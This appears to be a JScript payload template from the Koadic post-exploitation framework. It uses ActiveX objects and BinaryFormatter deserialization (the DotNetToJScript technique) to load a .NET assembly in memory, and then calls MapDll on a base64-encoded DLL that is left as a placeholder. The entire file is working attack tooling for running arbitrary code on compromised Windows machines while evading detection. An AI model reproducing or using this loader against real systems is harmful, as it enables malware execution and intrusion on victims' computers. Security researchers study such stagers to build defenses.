try
{
    var base64DLL = "~BASE64DLL~";
    var entry_class = 'TestClass';

    var stm = new ActiveXObject('System.IO.MemoryStream');
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList')

    for (i in serialized_obj)
        stm.WriteByte(serialized_obj[i]);

    stm.Position = 0;
    var n = fmt.SurrogateSelector;
    var d = fmt.Deserialize_2(stm);
    al.Add(n);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

    o.MapDll(base64DLL);
}
catch (e)
{
    Koadic.work.error(e);
}
